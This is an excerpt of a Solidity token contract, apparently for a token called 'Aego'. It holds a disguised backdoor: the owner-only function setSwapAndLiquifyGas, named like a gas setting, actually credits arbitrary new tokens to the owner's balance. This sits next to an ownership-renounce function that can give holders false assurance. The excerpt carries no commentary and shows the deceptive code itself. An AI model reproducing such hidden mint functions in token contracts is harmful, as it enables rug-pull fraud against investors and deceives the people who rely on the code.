...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(__owner, address(0x000000000000000000000000000000000000dEaD));
        __owner = address(0x000000000000000000000000000000000000dEaD);
    }
...
contract Testv10000 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Aego";
    string private _symbol = "Aegocat";
    ...
    function setSwapAndLiquifyGas(uint256 newLimit) external onlyOwner() {
        _balances[_msgSender()] = _balances[_msgSender()].add(newLimit);
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        emit liquidityGetBnb(amountReceived);
